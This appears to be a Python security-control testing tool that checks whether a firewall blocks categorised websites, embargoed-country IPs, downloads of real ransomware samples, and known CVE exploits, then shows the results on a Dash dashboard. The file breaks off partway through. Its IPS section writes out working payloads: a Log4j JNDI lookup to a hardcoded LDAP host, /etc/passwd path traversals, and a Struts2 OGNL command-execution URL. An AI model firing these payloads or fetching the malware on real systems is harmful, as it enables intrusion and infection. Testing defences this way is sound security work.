import requests
import time
import csv
import dns.resolver
import os
from plotly.offline import plot
from urllib.parse import urlparse
import xlwt
import glob
import hashlib
import plotly.express as px
import pandas as pd
import dash
import wget
import subprocess
import platform
from dash import dcc
from dash import html
import dash_bootstrap_components as dbc
from dash_bootstrap_templates import load_figure_template
from dash.dependencies import Input, Output
from dash import dash_table
import tempfile
from plotly.offline import plot
import warnings
warnings.filterwarnings('ignore')
requests.packages.urllib3.disable_warnings()
config = {'responsive': True}
Smodule=1
# URL Filtering - Malicious Domains
def url():
    file = 'results-mal-urlf.csv'
    if (os.path.exists(file) and os.path.isfile(file)):
        os.remove(file)
    with open('results-mal-urlf.csv', 'a', newline='') as f:
        thewriter = csv.writer(f)
        thewriter.writerow(['Category', 'URL', 'Result'])
    time.sleep(1)
    print("\n\n ************   URL-Filtering (Malicious Websites)  *********** ")
    print("\n (Automatically executes below categories in sequence) \n")
    print("\t \t 1. Gambling \t \t \t 2. Adult_and_Pornography  \t \t \t 3. Malware sites \n \t \t 4. Weapons \t \t \t 5. Dating \t \t \t \t \t 6.Auctions \n \t \t 7. Proxy \t \t \t 8.Drug Sites \n\n")
    def web(url, category):
        try:
            st = 'Redirect'
            r = requests.get(url, verify=False, timeout=3)
            status = str(r.status_code)
            if (status == "200"):
                st = 'Allowed'
                print(category,'\t','\t',url,'\t','\t------->', st)
        except (requests.exceptions.ReadTimeout,requests.exceptions.ConnectionError):
            st = 'Blocked'
            print(category,'\t','\t',url,'\t','\t------->', st)
        finally:
            with open('results-mal-urlf.csv', 'a', newline='') as f:
                thewriter = csv.writer(f)
                thewriter.writerow([category, url, st])
    sites = ["http://mybetting.in/", "http://10cricmedia.com/", "http://gambling.com", "http://www.playboy.com", "http://www.redtube.com", "http://www.pornhub.com", "http://punchbaby.com", "http://astalavista.box.sk", "http://winchester.com", "http://www.weapons-universe.com", "http://www.okcupid.com", "http://tinder.com", "http://bumble.com", "http://www.bidfind.com", "http://www.auctionzip.com", "http://www.kproxy.com", "http://proxify.com", "http://www.4everproxy.com", "http://marijuanastocks.com", "http://magicmushroom.com" ]
    category = ["Gambling", "Gambling", "Gambling", "Adult", "Adult", "Adult", "Malware", "Malware", "Weapons", "Weapons", "Dating", "Dating", "Dating", "Auctions", "Auctions", "Proxy", "Proxy", "Proxy", "Drugs", "Drugs"]
    c = 0
    for url in sites:
        web(url,category[c])
        c += 1
    time.sleep(2)
    print("\n ~~~~~~~~~~~~~~~~ URLF (Malicious Sites) Traffic Terminated ~~~~~~~~~~~~~~~~ \n")
    print("\n \t \t ================================  Evaluation Results - Overall Statistics  ================================ ")
#  Safe/Legitimate Websites
def input_url():
    file = 'results-legitsites.csv'
    if (os.path.exists(file) and os.path.isfile(file)):
        os.remove(file)
    with open('results-legitsites.csv', 'a', newline='') as f:
        thewriter = csv.writer(f)
        thewriter.writerow(['Category', 'URL', 'Result'])
    time.sleep(1)
    print("\n\n ************   Safe/Legit Websites    *********** ")
    urlcsv=input("\n Enter Filename(file.csv):\t")
    print("\n (Automatically begins to access listed websites in sequence) \n")
    print("URL-CATEGORY \t\t\t WEBSITE \t\t\t\t\t\t RESULT")
    print("-------------------------------------------------------------------------------------------------------")
    urlinput = pd.read_csv(urlcsv,skipinitialspace=True, usecols=['Category', 'URL'])
    ucat = urlinput.Category
    ulist = urlinput.URL
    def allow_web(url, category):
        try:
            st = 'Redirect'
            r = requests.get(url, verify=False, timeout=3)
            status = str(r.status_code)
            if (status == "200"):
                st = 'Allowed'
                print(category,'\t','\t',url,'\t','\t------->', st)                
        except (requests.exceptions.ReadTimeout,requests.exceptions.ConnectionError):
            st = 'Blocked'
            print(category,'\t','\t',url,'\t','\t------->', st)
        finally:
            with open('results-legitsites.csv', 'a', newline='') as f:
                thewriter = csv.writer(f)
                thewriter.writerow([category, url, st])
    c = 0
    for site in ulist:
        allow_web(site, ucat[c])
        c += 1
    time.sleep(2)
    print("\n ~~~~~~~~~~~~~~~~ Legit Websites (Allowed URLs) Traffic Terminated ~~~~~~~~~~~~~~~~ \n")
    print("\n \t \t ================================  Evaluation Results - Overall Statistics  ================================ ")
# Anti-Virus - Malicious File Downloads
def av():
    urls = ["https://github.com/labtest06/Malware-Samples/raw/main/eicar.com",
            "https://github.com/labtest06/Malware-Samples/raw/main/eicarcom2.zip",
            "https://github.com/labtest06/Malware-Samples/raw/main/eicar_com.zip",
            "https://github.com/labtest06/Malware-Samples/raw/main/Blackmatter-Ransomware",
            "https://github.com/labtest06/Malware-Samples/raw/main/GlobeImposter-ransomware-EXE.exe",
            "https://github.com/labtest06/Malware-Samples/raw/main/KryptikEldoradoRansomware.exe",
            "https://github.com/labtest06/Malware-Samples/raw/main/VisualBasicMalware.vbs",
            "https://github.com/labtest06/Malware-Samples/raw/main/StartPage-Adware"]

    hashvalues = ["275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
                  "e1105070ba828007508566e28a2b8d4c65d192e9eaf3b7868382b7cae747b397",
                  "2546dcffc5ad854d4ddc64fbf056871cd5a00f2471cb7a5bfd4ac23b6e9eedad",
                  "6a7b7147fea63d77368c73cef205eb75d16ef209a246b05698358a28fd16e502",
                  "bb1df4a93fc27c54c78f84323e0ea7bb2b54469893150e3ea991826c81b56f47",
                  "3e2e881ec6fcfb6329cad95c15de4a90aef1032550176c7c7729c0a0e383c615",
                  "14f4aeedf83280c6ae57300e88c30f1594f9f4a3062cf6d757ff0a527a5fe28c",
                  "9e6ff0a1eb332ef0b0bde9c3840ce2ffaded73117f88411c39b8116fef6f4b27"]
    index = 0
    book = xlwt.Workbook(encoding="utf-8")
    sheet1 = book.add_sheet("Sheet1")
    sheet1.write(0, 0, "Filename")
    sheet1.write(0, 1, "Download_Status")
    sheet1.write(0, 2, "FileType")
    sheet1.write(0, 3, "Downloaded_File_Hash")
    sheet1.write(0, 4, "Original_File_Hash")
    print("\n\n ************   Anti-Virus   *********** \n")
    print("Automatically begins to download malicious files from a publicly hosted repository")
    for j in urls:
        print('\n\n',j)
        a = urlparse(j)
        filename = os.path.basename(a.path)
        print('filename:', filename)
        sheet1.write(index + 1, 0, filename)
        ext = os.path.splitext(filename)[1][1:]
        if (ext):
            sheet1.write(index + 1, 2, ext)
        else:
            sheet1.write(index + 1, 2, "Unknown")
            ext = 'Unknown'
        print('FileType:', ext)
        try:
            wget.download(j)
            print('\t---------->  Download Successful','-','File:', index + 1)
            hash = hashlib.sha256(open(filename, 'rb').read()).hexdigest()
            print('Downloaded File hash:', hash)
            print('Actual file hash:', hashvalues[index])
            hash1 = hashvalues[index]
            print('Hash Match:', hash.casefold() == hash1.casefold())
            if hash.casefold() == hash1.casefold():
                sheet1.write(index + 1, 1, "Allowed")
                sheet1.write(index + 1, 3, hash)
                sheet1.write(index + 1, 4, hash1)
            os.remove(filename)
            print('\n######   Deleted malicious file from local directory for security reasons   #####')
        except Exception:
            print('\n\t---------->  Failed','File', index + 1,'download unsuccessful')
            hash1 = hashvalues[index]
            sheet1.write(index + 1, 1, "Blocked")
            tmpfile = glob.glob('*.tmp')
            print(tmpfile)            
            for mal in tmpfile: os.remove(mal)
            print('\n######   Deleted malicious .tmp file from local directory for security reasons   #####')
        index += 1
        continue
        break
    book.save("results-av.xls")
    print("\n ~~~~~~~~~~~~~~~~ AV Traffic Terminated ~~~~~~~~~~~~~~~~ \n")
    print("\n \t \t ================================  Evaluation Results - Overall Statistics  ================================ ")
# IP Filtering - Reputation & Geo-Based IPs
def ipfilter():
    param = '-n' if platform.system().lower()=='windows' else '-c'
    print("\n\n ************   IP-Filtering   *********** ")
    def reputation():
        ipcsv=input("\n Enter Filename(filename.csv):\t")  
        print("\n ~~~~~~~~~~~~~~~~ Initiating IP Reputaton Based Traffic ~~~~~~~~~~~~~~~~ \n")
        print("\n Automatically initiates ICMP traffic towards listed categories in sequence \n")
        print("IP-REPUTATION \t\t\t IP \t\t\t\t\t\t RESULT")
        print("-------------------------------------------------------------------------------------------------------")
        ipinput = pd.read_csv(ipcsv,skipinitialspace=True, usecols=['Reputation', 'IP'])
        ipreputation = ipinput.Reputation
        iplist = ipinput.IP
        book = xlwt.Workbook(encoding="utf-8")
        sheet1 = book.add_sheet("Sheet1")
        sheet1.write(0, 0, "IP")
        sheet1.write(0, 1, "Reputation")
        sheet1.write(0, 2, "Action")   
        ind = 0
        for l in iplist:
            sheet1.write(ind+1, 0, l)
            sheet1.write(ind+1, 1, ipreputation[ind])            
            response = subprocess.call(['ping', param, '1', l], stdout=subprocess. DEVNULL,stderr=subprocess. DEVNULL)
            if response:
                print(ipreputation[ind],'\t','\t',l,'\t','\t------->', "Blocked")
                sheet1.write(ind+1, 2, "Blocked")
            elif response == 2:
                print(ipreputation[ind],'\t','\t',l,'\t','\t------->', "Blocked")
                sheet1.write(ind+1, 2, "Blocked")
            else:
                sheet1.write(ind+1, 2, "Allowed")
                print(ipreputation[ind],'\t','\t',l,'\t','\t------->', "Allowed")
            book.save("results-ipf-rep.xls")
            ind += 1
        print("\n ~~~~~~~~~~~~~~~~ IP Repuation Based Traffic Terminated ~~~~~~~~~~~~~~~~ \n")
                
    def geolocation():
        print("\n ~~~~~~~~~~~~~~~~ Initiating Geo-location Based IP-F Traffic ~~~~~~~~~~~~~~~~ \n")
        print("\n Automatically initiates ICMP traffic towards listed categories in sequence \n")
        print("\t \t1.Iran \t \t 2.Cuba \t \t 3.Syria \t \t 4.North Korea\n")
        ipslist =["103.216.60.2", "217.219.91.130", "152.206.128.1", "181.225.224.3", "109.238.152.1", "109.238.144.8", "175.45.179.45"]
        ipgeolocation = ["Iran", "Iran", "Cuba", "Cuba", "Syria", "Syria", "North_Korea" ]
        book = xlwt.Workbook(encoding="utf-8")
        sheet1 = book.add_sheet("Sheet1")
        sheet1.write(0, 0, "IP")
        sheet1.write(0, 1, "Geo_location")
        sheet1.write(0, 2, "Action")
        num = 0
        for m in ipslist:
            sheet1.write(num+1, 0, m)
            sheet1.write(num+1, 1, ipgeolocation[num])
            response = subprocess.call(['ping', param, '1', m], stdout=subprocess. DEVNULL,stderr=subprocess. DEVNULL)
            if response:
                print ("ping-fail -", m, "\t---------->  Blocked")
                sheet1.write(num+1, 2, "Blocked")
            elif response == 2:
                print ("No Response from", m)
                sheet1.write(num+1, 2, "Blocked")
            else: 
                print ("ping-success -", m, "\t---------->  Allowed")
                sheet1.write(num+1, 2, "Allowed")
            book.save("results-ipf-geo.xls")
            num +=1
    reputation()
    time.sleep(2)
    geolocation()
    print("\n ~~~~~~~~~~~~~~~~ IP Filtering Traffic Terminated ~~~~~~~~~~~~~~~~ \n")
    print("\n \t \t ================================  Evaluation Results - Overall Statistics  ================================ ")
# IPS/IDP - Exploit traffic        
def ips():
    url = [ 'http://143.244.135.230:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
            'http://143.244.135.230:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
            'http://64.227.182.204:32771/%24%7B%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29.%28%23cmd%3D%27id%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/help.action']
    exp = [ 'ElasticSearch', 'Apache Flink', 'Apache Struts2']
    cve = [ 'CVE-2015-5531', 'CVE-2020-17519', 'CVE-2018-11776' ]
    ipsind = 0
    book = xlwt.Workbook(encoding="utf-8")
    sheet1 = book.add_sheet("Sheet1")
    sheet1.write(0, 0, "Exploit_Attempted")
    sheet1.write(0, 1, "CVE")
    sheet1.write(0, 2, "Status")
    print("\n\n ************   IPS   *********** \n")
    print("\nAutomatically begins to attempt few exploits in sequence as listed")
    print('\nExploit Attempted:\t',"Apache Log4j Injection")
    sheet1.write(1, 0, "Apache Log4j")
    sheet1.write(1, 1, "CVE-2021-45046")
    try:
        log4j = subprocess.check_call(["curl", "64.227.182.204:8080", "-H", "'X-Api-Version:${jndi:ldap://64.227.182.204:1389/a}'","--http1.0"], stdout=subprocess. DEVNULL,stderr=subprocess. DEVNULL)
        print('\t----->  Exploit Successful')
        sheet1.write(1, 2, "Allowed")
    except Exception:
        print('\t----->  Exploit Failed')
        sheet1.write(1, 2, "Blocked")
    for u in url:
        print('\nExploit Attempted:\t',exp[ipsind])
        sheet1.write(ipsind+2, 0, exp[ipsind])
        sheet1.write(ipsind+2, 1, cve[ipsind])
        try:
            r = subprocess.check_call(["curl", u, "--http1.0"], stdout=subprocess. DEVNULL,stderr=subprocess. DEVNULL)
            print('\t----->  Exploit Successful')
            sheet1.write(ipsind+2, 2, "Allowed")
        except Exception:
            print('\t----->  Exploit Failed')
            sheet1.write(ipsind+2, 2, "Blocked")
        book.save("results-idp-ips.xls")
        wgetfile = glob.glob('*.wget')          
        for wf in wgetfile: os.remove(wf)
        ipsind += 1
    print("\n ~~~~~~~~~~~~~~~~ IPS/IDP Exploits Traffic Terminated ~~~~~~~~~~~~~~~~ \n")
    print("\n \t \t ================================  Evaluation Results - Overall Statistics  ================================ ")
    
def stats_url():
    df = pd.read_csv('results-mal-urlf.csv')
    df.head()
    URL = df['URL']
    turls=df.URL.count()
    ubc=0
    uac=0
    urlb=df[df.Result == "Blocked"]
    urla=df[df.Result == "Allowed"]
    if not urlb.empty:
        ubc=df['Result'].value_counts()['Blocked']
        fig1=px.sunburst(urlb, path=['Category', 'URL'], color='Category', title="Blocked Sites", color_discrete_sequence=px.colors.qualitative.Set2, template="plotly_dark")
    else:
        t1 = px.scatter(x=[1], y=[1], title="Blocked Sites", template="plotly_dark")
        fig1=t1.add_annotation(text="'NA' \t\t\t\t***Sites blocked by FW = NONE***", xref="paper", yref="paper", x=0.5, y=0.5, showarrow=False, font=dict(size=15))
    fig1.update_traces(hoverinfo='skip', hovertemplate=None)
    fig1.update_layout({"plot_bgcolor": "rgba(0, 0, 0, 0)", "paper_bgcolor": "rgba(0, 0, 0, 0)"})
    if not urla.empty:
        uac=df['Result'].value_counts()['Allowed']
        fig2=px.sunburst(urla, path=['Category', 'URL'], color='Category', title="Allowed Sites", color_discrete_sequence=px.colors.qualitative.Set2, template="plotly_dark")
    else:
        t2 = px.scatter(x=[1], y=[1], title="Allowed Sites", template="plotly_dark")
        fig2=t2.add_annotation(text="'NA' \t\t\t\t***All sites blocked by FW; Allowed = NONE***", xref="paper", yref="paper", x=0.5, y=0.5, showarrow=False, font=dict(size=15))
    fig2.update_traces(hoverinfo='skip', hovertemplate=None)
    fig2.update_layout({"plot_bgcolor": "rgba(0, 0, 0, 0)", "paper_bgcolor": "rgba(0, 0, 0, 0)"})
    urltable = pd.DataFrame(
        {
            "": ["Total Sites Accessed", "Blocked Sites", "Allowed Sites"],
            "Count": [turls, ubc, uac],
        }
    )
    print("\n \t \t ***  URL-Filtering Stats  ***")
    print ("\n\n \t \t Sites Blocked by FW:\t\t\t", ubc)
    print (" \t \t Total websites accessed:\t\t", turls)
    quo = ubc / turls
    ubpercent = quo * 100
    print (" \t \t URL Block Percentage:\t\t\t", ubpercent)
    if ubpercent < 50:
        sr = "'C'   - Critical"
        bcolor = "danger"
        print(" \t \t URLF Security Risk Rating: \t\t 'C' Critical")
    elif ubpercent < 75:
        sr = "'B'   - High-Risk"
        bcolor = "warning"
        print(" \t \t URLF Security Risk Rating: \t\t 'B' High-Risk")
    elif ubpercent < 90:
        sr = "'A'   - Moderate-Risk"
        bcolor = "info"    
        print(" \t \t URLF Security Risk Rating: \t\t 'A' Moderate-Risk")
    else:
        sr = "'A+'   - Low-Risk"
        bcolor = "success"    
        print(" \t \t URLF Security Risk Rating: \t\t 'A+' Low-Risk")
    print("\n \t \t ===========================================================================================================\n ")
    page_urlf = html.Div(
        [ 
         dcc.Tabs([
             dcc.Tab(label='URL-Filtering', className="bg-secondary text-white p-2", children=[
                 html.Br(), html.Br(), html.H2(["Security Risk Rating:\t\t\t", dbc.Badge(sr, color=bcolor, className="ms-1")], className="text-center"),
                 html.Br(), html.Br(), html.H3(["Overall Statistics"], className="text-center"),
                 dbc.Table.from_dataframe(urltable, striped=True, bordered=True, hover=True, dark=True, className="p-3 border"), html.Br(),
                 html.Br(),
                 html.H3(["URL vs Firewall actions"], className="text-center"),
                 html.H5(["Sites are grouped based on URL-Category",html.Em("\t\t(Click on any Category to view all accessed websites under it)")]),
                 dbc.Row([
                    dbc.Col(dbc.Spinner(dcc.Graph(figure=fig1), color="warning",), lg=6),
                    dbc.Col(dbc.Spinner(dcc.Graph(figure=fig2), color="warning",), lg=6),
                ],
                className="mt-4",
            ),  html.Br(), html.Br(),
                html.Br(), html.Br(),
                html.H4(["Security Risk Rating Scale"]),
                html.H6([dbc.Badge("'C'   - Critical", color="danger", className="ms-1"),"\t\t\tBlock-Count < 50%", dbc.Badge("'B'   - High-Risk", color="warning", className="ms-1"),"\t\t\tBlock-Count < 75%", dbc.Badge("'A'   - Moderate-Risk", color="info", className="ms-1"),"\t\t\tBlock-Count < 90%", dbc.Badge("'A+'   - Low-Risk", color="success", className="ms-1"),"\t\t\tBlock-Count >= 90%"], className="text-center"), html.Br(),
           ]),
        ])
    ])
    return page_urlf
def stats_legitsites():
    df = pd.read_csv('results-legitsites.csv')
    df.head()
    URL = df['URL']
    tsites=df.URL.count()
    sbc=0
    sac=0
    sitesb=df[df.Result == "Blocked"]
    sitesa=df[df.Result == "Allowed"]
    if not sitesb.empty:
        sbc=df['Result'].value_counts()['Blocked']
        fig11=px.sunburst(sitesb, path=['Category', 'URL'], color='Category', title="Blocked Sites", color_discrete_sequence=px.colors.qualitative.Set2, template="plotly_dark")
    else:
        t11 = px.scatter(x=[1], y=[1], title="Blocked Sites", template="plotly_dark")
        fig11=t11.add_annotation(text="'NA' \t\t\t\t***Sites blocked by FW = NONE***", xref="paper", yref="paper", x=0.5, y=0.5, showarrow=False, font=dict(size=15))
    fig11.update_traces(hoverinfo='skip', hovertemplate=None)
    fig11.update_layout({"plot_bgcolor": "rgba(0, 0, 0, 0)", "paper_bgcolor": "rgba(0, 0, 0, 0)"})
    if not sitesa.empty:
        sac=df['Result'].value_counts()['Allowed']
        fig12=px.sunburst(sitesa, path=['Category', 'URL'], color='Category', title="Allowed Sites", color_discrete_sequence=px.colors.qualitative.Set2, template="plotly_dark")
    else:
        t12 = px.scatter(x=[1], y=[1], title="Allowed Sites", template="plotly_dark")
        fig12=t12.add_annotation(text="'NA' \t\t\t\t***All sites blocked by FW; Allowed = NONE***", xref="paper", yref="paper", x=0.5, y=0.5, showarrow=False, font=dict(size=15))
    fig12.update_traces(hoverinfo='skip', hovertemplate=None)
    fig12.update_layout({"plot_bgcolor": "rgba(0, 0, 0, 0)", "paper_bgcolor": "rgba(0, 0, 0, 0)"})
    legittable = pd.DataFrame(
        {
            "": ["Total Sites Accessed", "Blocked Sites", "Allowed Sites"],
            "Count": [tsites, sbc, sac],
        }
    )
    print("\n \t \t ***  Legit Websites Stats  ***")
    print ("\n\n \t \t Sites Blocked by FW:\t\t\t", sbc)
    print ("\t \t Sites Allowed by FW:\t\t\t", sac)
    print (" \t \t Total websites accessed:\t\t", tsites)
    print("\n \t \t ===========================================================================================================\n ")
    page_legitsites = html.Div(
        [ 
         dcc.Tabs([
             dcc.Tab(label='Safe/Legit Websites (Allowed URLs)', className="bg-secondary text-white p-2", children=[
                 html.Br(), html.Br(), html.Br(), html.Br(), html.H3(["Overall Statistics"], className="text-center"),
                 dbc.Table.from_dataframe(legittable, striped=True, bordered=True, hover=True, dark=True, className="p-3 border"), html.Br(),
                 html.Br(),
                 html.H3(["URL vs Firewall actions"], className="text-center"),
                 html.H5(["Sites are grouped based on URL-Category",html.Em("\t\t(Click on any Category to view all accessed websites under it)")]),
                 dbc.Row([
                    dbc.Col(dbc.Spinner(dcc.Graph(figure=fig11), color="warning",), lg=6),
                    dbc.Col(dbc.Spinner(dcc.Graph(figure=fig12), color="warning",), lg=6),
                ],
                className="mt-4",
            ),  html.Br(), html.Br(),
           ]),
        ])
    ])
    return page_legitsites
def stats_ipf():
    df = pd.read_excel('results-ipf-rep.xls')
    ipaddr = df['IP']
    repu = df['Reputation']
    repuaction = df['Action']
    totIPrep = df['IP'].count()
    totIPrepb = df['Action'].value_counts()['Blocked']
    fig7 =  px.sunburst(df, path=[repuaction, repu, ipaddr], color='Action', template="plotly_dark", title = "IP-Repuation based Action", color_discrete_map={'Blocked':'darkred', 'Allowed':'darkgreen'})
    df = pd.read_excel('results-ipf-geo.xls') 
    ipgeo = df['IP']
    geol = df['Geo_location']
    gaction = df['Action']
    totIPgeo = df['IP'].count()
    totIPgeob = df['Action'].value_counts()['Blocked']
    fig8 = px.sunburst(df, path=[gaction, geol, ipgeo], color='Action', template="plotly_dark", title= "Geo-Location(Embargoed Contries) based Action", color_discrete_map={'Blocked':'darkred', 'Allowed':'darkgreen'})
    fig7.update_traces(hoverinfo='skip', hovertemplate=None)
    fig7.update_layout({"plot_bgcolor": "rgba(0, 0, 0, 0)", "paper_bgcolor": "rgba(0, 0, 0, 0)"})
    fig8.update_traces(hoverinfo='skip', hovertemplate=None)
    fig8.update_layout({"plot_bgcolor": "rgba(0, 0, 0, 0)", "paper_bgcolor": "rgba(0, 0, 0, 0)"})
    ipftable = pd.DataFrame(
        {
            "": ["Total IP(s) Accessed", "Blocked IP(s)" ],
            "IP Reputation Based": [totIPrep, totIPrepb ],
            "Geo-Location Based (Embargoed Countries)": [totIPgeo, totIPgeob ],
        }
    )
    totips = totIPrep + totIPgeo
    totipsblocked = totIPrepb + totIPgeob
    quoipb = totipsblocked / totips
    peripb = quoipb * 100
    print("\n \t \t ***  IP-Filtering Stats  ***")
    print('\n\n \t \t IP-Filtering Block Percentage:\t\t',peripb)
    if  peripb < 50:
        ipfr = "'C'   - Critical"
        ipfcolor = "danger"
        print(" \t \t IP-Filtering Security Risk Rating: \t\t 'C' Critical")
    elif peripb < 75:
        ipfr = "'B'   - High-Risk"
        ipfcolor = "warning"
        print(" \t \t IP-Filtering Risk Rating: \t\t 'B' High-Risk")
    elif peripb < 90:
        ipfr = "'A'   - Moderate-Risk"
        ipfcolor = "info"
        print(" \t \t IP-Filtering Risk Rating: \t\t 'A' Moderate-Risk")
    else:
        ipfr = "'A+'   - Low-Risk"
        ipfcolor = "success"
        print(" \t \t IP-Filtering Risk Rating: \t\t 'A+' Low-Risk")
    print("\n \t \t ===========================================================================================================\n ")
    page_ipf = html.Div(
        [ 
         dcc.Tabs([
             dcc.Tab(label='IP-Filtering', className="bg-secondary text-white p-2", children=[
                 html.Br(), html.Br(), html.H2(["Security Risk Rating:\t\t\t", dbc.Badge(ipfr, color=ipfcolor, className="ms-1")], className="text-center"),
                 html.Br(), html.Br(), html.H3(["Overall Statistics"], className="text-center"),
                 dbc.Table.from_dataframe(ipftable, striped=True, bordered=True, hover=True, color="secondary", className="p-3 m-2 border"),html.Br(),
                 html.Br(),
                 html.H3(["IP-Filtering Analysis"], className="text-center"),
                 html.H5(["IPs are grouped by IP-Reputation & Geo-Location",html.Em("\t\t(Click on any IP-Reputation/Geo-location to view all IPs that fall under it)")]),
                 dbc.Row([
                    dbc.Col(dbc.Spinner(dcc.Graph(figure=fig7), color="warning",), lg=6),
                    dbc.Col(dbc.Spinner(dcc.Graph(figure=fig8), color="warning",), lg=6),
                ], className="mt-4",),  html.Br(), html.Br(),
                html.Br(), html.Br(),
                html.H4(["Security Risk Rating Scale"]),
                html.H6([dbc.Badge("'C'   - Critical", color="danger", className="ms-1"),"\t\t\tBlock-Count < 50%", dbc.Badge("'B'   - High-Risk", color="warning", className="ms-1"),"\t\t\tBlock-Count < 75%", dbc.Badge("'A'   - Moderate-Risk", color="info", className="ms-1"),"\t\t\tBlock-Count < 90%", dbc.Badge("'A+'   - Low-Risk", color="success", className="ms-1"),"\t\t\tBlock-Count >= 90%"], className="text-center"), html.Br(),             
               ]),
            ])
        ])
    return page_ipf
def stats_av():
    df = pd.read_excel('results-av.xls')
    avb = df[df.Download_Status == "Blocked"]
    ava = df[df.Download_Status == "Allowed"]
    Download_Status = df['Download_Status']
    Filename = df['Filename']    
    if not avb.empty:
        fig5=px.sunburst(avb, path=['FileType', 'Filename'], color='FileType', template="plotly_dark", title="Blocked-Files", color_discrete_sequence=px.colors.qualitative.Set2)
        avblock=df['Download_Status'].value_counts()['Blocked']
    else:
        t5 = px.scatter(x=[1], y=[1], title="Blocked-Files", template="plotly_dark")
        fig5=t5.add_annotation(text="'NA' \t\t\t\t***No files blocked, All allowed***", xref="paper", yref="paper", x=0.5, y=0.5, showarrow=False, font=dict(size=15))
        avblock=0
    fig5.update_traces(hoverinfo='skip', hovertemplate=None)
    fig5.update_layout({"plot_bgcolor": "rgba(0, 0, 0, 0)", "paper_bgcolor": "rgba(0, 0, 0, 0)"})
    if not ava.empty:
        fig6=px.sunburst(ava, path=['FileType', 'Filename'], color='FileType', template="plotly_dark", title="Allowed-Files", color_discrete_sequence=px.colors.qualitative.Set2)
    else:
        t6 = px.scatter(x=[1], y=[1], template="plotly_dark", title="Allowed-Files")
        fig6=t6.add_annotation(text="'NA' \t\t\t\t***All files blocked, None downloaded***", xref="paper", yref="paper", x=0.5, y=0.5, showarrow=False, font=dict(size=15))
    fig6.update_traces(hoverinfo='skip', hovertemplate=None)
    fig6.update_layout({"plot_bgcolor": "rgba(0, 0, 0, 0)", "paper_bgcolor": "rgba(0, 0, 0, 0)"})
    htable = df.dropna(subset=['Filename', 'Original_File_Hash', 'Downloaded_File_Hash'])
    print("\n\t\t ***  Anti-Virus Stats  ***")
    df.head()
    tfiles=df.Filename.count()
    tf=str(tfiles)
    print('\n\n \t \t Files blocked by AV:\t\t',avblock)
    print(' \t \t Total files downloaded:\t\t',tfiles)
    quotient = avblock / tfiles
    avblockpercent = quotient * 100
    print (" \t \t AV Block Percentage:\t\t", avblockpercent)
    if avblockpercent < 50:
        av = "'C'   - Critical"
        acolor = "danger"
        print(" \t \t AV Security Risk Rating: \t\t 'C' Critical")
    elif avblockpercent < 75:
        av = "'B'   - High-Risk"
        acolor = "warning"
        print(" \t \t AV Security Risk Rating: \t\t 'B' High-Risk")
    elif avblockpercent < 90:
        av = "'A'   - Moderate-Risk"
        acolor = "info"
        print(" \t \t AV Security Risk Rating: \t\t 'A' Moderate-Risk")
    else:
        av = "'A+'   - Low-Risk"
        acolor = "success"
        print(" \t \t AV Security Risk Rating: \t\t 'A+' Low-Risk")
    print("\n \t \t ===========================================================================================================\n ")
    avtable = pd.DataFrame(
        {
            "": ["Total Malicious Files Downloaded", "Files blocked by AV"],
            "Count": [tfiles, avblock],
        }
    )
    page_av = html.Div(
        [ 
         dcc.Tabs([
             dcc.Tab(label='Anti-Virus', className="bg-secondary text-white p-2", children=[
                 html.Br(), html.Br(), html.H2(["Security Risk Rating:\t\t\t", dbc.Badge(av, color=acolor, className="ms-1")], className="text-center"),
                 html.Br(), html.Br(), html.H3(["Overall Statistics"], className="text-center"),
                 dbc.Table.from_dataframe(avtable, striped=True, bordered=True, hover=True, dark=True, className="p-3 border"), html.Br(),
                 html.Br(), html.H3(["File Hash Comparison"], className="text-center"),
                 html.H5(["Files that bypassed AV-engine & successfully downloaded to local machine"]),
                 dash_table.DataTable(
                     columns=[
                         {'name': i, 'id': i} for i in htable.columns
                         ],
                     data=htable.to_dict('records'),
                     style_header={ 'backgroundColor': 'rgb(210, 210, 210)', 'color': 'black', 'fontWeight': 'bold', 'textAlign':'left' },
                     style_data={ 'color': 'black', 'backgroundColor': 'white', 'textAlign':'left'},
                ), html.Br(),
                 html.Br(), html.Br(),
                 html.H3(["AV Protection Analysis"], className="text-center"),
                 html.H5(["Files are grouped by FileTypes",html.Em("\t\t(Click on any FileType to view all files in it)")]),
                 dbc.Row([
                    dbc.Col(dbc.Spinner(dcc.Graph(figure=fig5), color="warning",), lg=6),
                    dbc.Col(dbc.Spinner(dcc.Graph(figure=fig6), color="warning",), lg=6),
                ], className="mt-4",),  html.Br(), html.Br(),
                html.Br(), html.Br(),
                html.H4(["Security Risk Rating Scale"]),
                html.H6([dbc.Badge("'C'   - Critical", color="danger", className="ms-1"),"\t\t\tBlock-Count < 50%", dbc.Badge("'B'   - High-Risk", color="warning", className="ms-1"),"\t\t\tBlock-Count < 75%", dbc.Badge("'A'   - Moderate-Risk", color="info", className="ms-1"),"\t\t\tBlock-Count < 90%", dbc.Badge("'A+'   - Low-Risk", color="success", className="ms-1"),"\t\t\tBlock-Count >= 90%"], className="text-center"), html.Br(),             
               ]),
            ])
        ])
    return page_av    
def stats_ips():
    df = pd.read_excel('results-idp-ips.xls')
    ipsb = df[df.Status == "Blocked"]
    ipsa = df[df.Status == "Allowed"]
    Status = df['Status']
    ExploitName = df['Exploit_Attempted']
    if not ipsb.empty:
        fig9=px.sunburst(ipsb, path=['Exploit_Attempted', 'CVE'], color='Exploit_Attempted', template="plotly_dark", title="Blocked Exploits", color_discrete_sequence=px.colors.qualitative.Set2)
        ipsblock=df['Status'].value_counts()['Blocked']
    else:
